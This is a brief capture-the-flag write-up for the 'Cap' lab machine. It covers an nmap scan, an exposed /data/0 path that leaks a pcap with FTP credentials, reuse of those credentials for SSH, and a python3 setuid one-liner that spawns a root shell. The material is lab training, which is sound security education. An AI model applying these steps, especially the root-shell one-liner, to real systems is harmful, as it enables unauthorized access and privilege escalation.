# Cap

## Use nmap to find open ports
Command
```bash
nmap -sV 10.10.10.245
```

Output
```bash
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Gunicorn
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
``` 

## Explore opened webpage

Go to http://10.10.10.245/

## Path traversal at Security Snapshot

At `/data/{number}`

`/data/0/` leads to admin test data which allows downloading .pcap containing user login credentials via FTP protocol.

Able to use same username and password to login SSH server.

## User Flag
User flag in `/home/cap/user.txt`

## Privilege Escalation
Use linpeas to find out that the user `cap` has can use python3 to setuid(0) to allow running as root.

```bash
python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

## Root Flag
Root flag in `/root/root.txt`